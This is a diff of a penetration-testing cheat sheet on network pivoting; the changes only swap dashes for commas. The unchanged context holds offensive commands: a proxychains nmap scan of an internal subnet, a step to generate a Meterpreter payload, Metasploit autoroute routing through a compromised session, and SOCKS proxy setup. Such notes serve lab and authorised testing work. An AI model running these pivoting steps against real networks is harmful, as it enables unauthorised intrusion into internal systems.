@@ -307,7 +307,7 @@ proxychains nmap -vvv -sT -Pn -n --top-ports 20 172.16.50.0/24
 
 ## Meterpreter Tunneling (autoroute + socks_proxy)
 
-Full MSF-based pivot — no SSH needed on the pivot host.
+Full MSF-based pivot, no SSH needed on the pivot host.
 
 ```bash
 # 1. Generate Linux Meterpreter payload
@@ -338,7 +338,7 @@ run autoroute -s 172.16.5.0/23         # add route through session
 run autoroute -p                        # verify routes
 ```
 
-On Kali — `/etc/proxychains.conf` must have `socks4 127.0.0.1 9050`. Then use proxychains normally.
+On Kali, `/etc/proxychains.conf` must have `socks4 127.0.0.1 9050`. Then use proxychains normally.
 
 **Ping sweep from within a Meterpreter shell:**
 ```bash
